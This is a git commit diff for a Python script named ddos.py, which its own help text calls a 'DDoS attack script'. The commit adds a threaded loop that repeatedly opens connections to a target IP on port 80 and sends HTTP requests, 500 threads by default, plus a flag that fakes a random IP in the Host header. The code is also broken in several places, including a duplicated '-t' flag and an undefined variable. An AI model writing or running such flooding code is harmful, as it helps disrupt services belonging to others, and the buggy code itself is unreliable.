044b634a9f75217bd3a3679a21dcde58eab6f0fc
N00ber17 <azernaceur17@gmail.com>
2024-05-30 17:07:30 +0100

    Finished the implementation for port 80

--- ddos.py
+++ ddos.py
@@ -1,11 +1,11 @@
 import socket
-import sys
 import threading
 import argparse
 import ipaddress
 import random
 
 
+# Function to define the IP address type
 def ip_address(ip):
     try:
         return ipaddress.ip_address(ip)
@@ -13,15 +13,34 @@ def ip_address(ip):
         raise argparse.ArgumentTypeError(f"Invalid IP address {ip}")
 
 
-parser = argparse.ArgumentParser(description='DDoS attack script using simulated multithreading')
-parser.add_argument('-t', '--target', type=ip_address, required=True, help="Target IP address")
-parser.add_argument('-p', '--port', type=int, required=True, help="The port the script will attack. eg: 80 <--> (http)")
-parser.add_argument('-s', '--spoof', action='store_true', help='Use a spoofed random IP address')
+# Parsing the flags
+parser = argparse.ArgumentParser(description='DDoS attack script using simulated multithreading.')
+parser.add_argument('-t', '--target', type=ip_address, required=True, help="Target IP address.")
+parser.add_argument('-p', '--port', type=int, default=80, help="The port the script will attack (only 80 is supported for now)")
+parser.add_argument('-s', '--spoof', action='store_true', help='Use a spoofed random IP address.')
+parser.add_argument('-t', '--threads', type=int, default=500,  help='Specify the numbers of threads to be running.')
 
 args = parser.parse_args()
 
+# Generating a random ip address for spoofing
 if args.spoof:
     fip = f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
     fip = ip_address(fip)
 else:
     print('[-] Warning: Using your IP address in the request headers. Use -s to spoof your IP.')
+
+
+# The attack method
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((args.target, args.port))
+        s.sendto(("GET" + args.target + " HTTP/1.1\r\n").encode('ascii'), (args.target, args.port))
+        s.sendto(("Host: " + fip + "\r\n\r\n").encode('ascii'), (args.target, args.port))
+        s.close()
+
+
+# Running multiple threads
+for i in range(args.threads):
+    thread = threading.Thread(target=attack)
+    thread.start()
